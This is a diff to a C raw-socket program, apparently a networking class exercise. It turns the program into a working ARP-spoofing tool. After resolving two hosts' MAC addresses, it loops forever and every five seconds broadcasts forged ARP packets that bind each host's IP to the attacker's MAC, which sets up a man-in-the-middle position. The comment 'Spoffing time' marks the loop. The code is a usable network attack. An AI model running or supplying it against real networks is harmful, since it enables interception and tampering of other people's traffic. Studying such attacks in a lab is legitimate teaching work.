@@ -9,6 +9,7 @@
 #include <sys/socket.h>
 #include <net/if.h>
 #include <netinet/ether.h>
+#include<unistd.h>
 #include "arp.h"
 
 unsigned char my_mac[6];
@@ -56,6 +57,7 @@ int main(int argc, char *argv[])
 	char ifName[IFNAMSIZ];
 	struct sockaddr_ll socket_address;
 	int sockfd, numbytes;
+	int spoofing_mode = ARP_REPLY;
 
 	char pc1_ip_string[16], pc2_ip_string[16];
 	unsigned char pc1_ip[4], pc2_ip[4];
@@ -64,11 +66,13 @@ int main(int argc, char *argv[])
 	union eth_buffer buffer_u;
 
 	/* Get interface name */
-	if (argc == 4)
+	if (argc >= 4)
 	{
 		strcpy(ifName, argv[1]);
 		strcpy(pc1_ip_string, argv[2]);
 		strcpy(pc2_ip_string, argv[3]);
+		if(argc == 5)
+			spoofing_mode = atoi(argv[4]);
 	}
 	else
 		strcpy(ifName, DEFAULT_IF);
@@ -122,7 +126,7 @@ int main(int argc, char *argv[])
 	printf("PC1 IP: %d.%d.%d.%d\n",pc1_ip[0],pc1_ip[1],pc1_ip[2],pc1_ip[3]);
 
 		/* ARP Request to get MAC of the computer 1*/
-	buffer_u = fill_arp(my_ip, my_mac, pc1_ip, bcast_mac, 1);
+	buffer_u = fill_arp(my_ip, my_mac, pc1_ip, bcast_mac, ARP_REQUEST);
 
 	memcpy(socket_address.sll_addr, bcast_mac, 6);
 	if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
@@ -152,7 +156,7 @@ int main(int argc, char *argv[])
 	printf("PC2 IP: %d.%d.%d.%d\n",pc2_ip[0],pc2_ip[1],pc2_ip[2],pc2_ip[3]);
 
 		/* ARP Request to get MAC of the computer 1*/
-	buffer_u = fill_arp(my_ip, my_mac, pc2_ip, bcast_mac, 1);
+	buffer_u = fill_arp(my_ip, my_mac, pc2_ip, bcast_mac, ARP_REQUEST);
 
 	memcpy(socket_address.sll_addr, bcast_mac, 6);
 	if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
@@ -168,22 +172,34 @@ int main(int argc, char *argv[])
 		}
 	}
 
-	printf("PC1 MAC: %x:%x%x:%x:%x:%x\n", pc2_mac[0],pc2_mac[1],pc2_mac[2],pc2_mac[3],pc2_mac[4],pc2_mac[5]);
+	printf("PC2 MAC: %x:%x%x:%x:%x:%x\n", pc2_mac[0],pc2_mac[1],pc2_mac[2],pc2_mac[3],pc2_mac[4],pc2_mac[5]);
 
 
 	/* End of configuration. Now we can send and receive data using raw sockets. */
 
 
-	/* To send data (in this case we will cook an ARP packet and broadcast it =])... */
+	/* Spoffing time */
 
-	buffer_u = fill_arp(atc_ip, my_mac, dst_ip, dst_mac, 2);
+	while(1)
+	{
+		buffer_u = fill_arp(pc1_ip, my_mac, pc2_ip, pc2_mac, spoofing_mode);
 
-	/* Send it.. */
-	printf("sendind\n");
-	memcpy(socket_address.sll_addr, dst_mac, 6);
-	if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+		/* Send it.. */
+		printf("sendind PC2\n");
+		memcpy(socket_address.sll_addr, bcast_mac, 6);
+		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 		printf("Send failed\n");
 
+		buffer_u = fill_arp(pc2_ip, my_mac, pc1_ip, pc1_mac, spoofing_mode);
+
+		/* Send it.. */
+		printf("sendind PC1\n");
+		memcpy(socket_address.sll_addr, bcast_mac, 6);
+		if (sendto(sockfd, buffer_u.raw_data, sizeof(struct eth_hdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+		printf("Send failed\n");
+
+		sleep(5);
+	}
 
 	/* To receive data (in this case we will inspect ARP and IP packets)... */
 
